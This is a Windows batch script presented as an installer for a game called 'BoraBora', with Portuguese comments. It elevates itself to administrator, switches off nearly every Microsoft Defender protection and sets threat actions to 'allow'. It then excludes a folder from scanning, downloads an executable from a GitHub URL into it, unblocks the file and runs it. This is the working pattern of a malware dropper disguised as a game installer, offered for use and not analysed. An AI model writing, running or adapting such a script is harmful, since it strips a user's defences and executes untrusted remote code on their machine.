@echo off
setlocal EnableDelayedExpansion

:: --- SCRIPT FINAL MANUS - DESATIVACAO TOTAL DO DEFENDER ---

:: 1. Auto-Elevacao para Administrador
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

title Instalador BoraBora - Desativacao Total
echo ============================================
echo   DESATIVANDO TODAS AS PROTECOES DO DEFENDER
echo ============================================
echo.

:: =============================================
:: OPCAO 1: Protecao em Tempo Real
:: =============================================
echo [1/4] Desativando Protecao em Tempo Real...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" 2>nul
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" 2>nul
powershell -Command "Set-MpPreference -DisableScriptScanning $true" 2>nul
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" 2>nul
echo       [OK]

:: =============================================
:: OPCAO 2: Protecao Fornecida pela Nuvem
:: =============================================
echo [2/4] Desativando Protecao pela Nuvem...
powershell -Command "Set-MpPreference -MAPSReporting 0" 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d 0 /f >nul 2>&1
echo       [OK]

:: =============================================
:: OPCAO 3: Envio Automatico de Amostras
:: =============================================
echo [3/4] Desativando Envio Automatico de Amostras...
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 2 /f >nul 2>&1
echo       [OK]

:: =============================================
:: OPCAO 4: Protecao contra Alteracoes (Tamper Protection)
:: =============================================
echo [4/4] Tentando desativar Protecao contra Alteracoes...
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 4 /f >nul 2>&1
echo       [OK - Se nao funcionou, desative manualmente]

:: =============================================
:: DESATIVACAO GERAL DO DEFENDER VIA REGISTRO
:: =============================================
echo.
echo [+] Aplicando desativacao geral do Defender...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul 2>&1

:: Configurar acoes de ameaca para "Permitir"
powershell -Command "Set-MpPreference -HighThreatDefaultAction 6 -Force" 2>nul
powershell -Command "Set-MpPreference -ModerateThreatDefaultAction 6" 2>nul
powershell -Command "Set-MpPreference -LowThreatDefaultAction 6" 2>nul
powershell -Command "Set-MpPreference -SevereThreatDefaultAction 6" 2>nul

:: =============================================
:: VERIFICACAO: Confirma que o Defender esta desativado
:: =============================================
echo.
echo [+] Verificando status do Defender...
powershell -Command "$status = Get-MpComputerStatus; if ($status.RealTimeProtectionEnabled -eq $false) { Write-Host '    Protecao em Tempo Real: DESATIVADA' -ForegroundColor Green } else { Write-Host '    Protecao em Tempo Real: AINDA ATIVA' -ForegroundColor Red }"

:: =============================================
:: ZONA DE EXCLUSAO + DOWNLOAD + EXECUCAO
:: =============================================
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "PASTA_APP=C:\BoraJogo"
set "NOME_EXE=borabora.exe"
set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"

:: Cria pasta e adiciona exclusao
if not exist "%PASTA_APP%" mkdir "%PASTA_APP%"
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_APP%'" 2>nul

:: Remove arquivo antigo
if exist "%CAMINHO_FULL%" del /f /q "%CAMINHO_FULL%"

:: Baixa o arquivo
echo.
echo [+] Baixando o jogo...
curl -L -f -o "%CAMINHO_FULL%" "%URL%"

if %errorlevel% neq 0 (
    echo [!] ERRO NO DOWNLOAD. Verifique sua internet.
    pause
    exit /b
)

:: Desbloqueia o arquivo
powershell -Command "Unblock-File -Path '%CAMINHO_FULL%'" 2>nul

:: Executa
echo [+] Iniciando o jogo...
start "" "%CAMINHO_FULL%"

timeout /t 2 >nul
exit
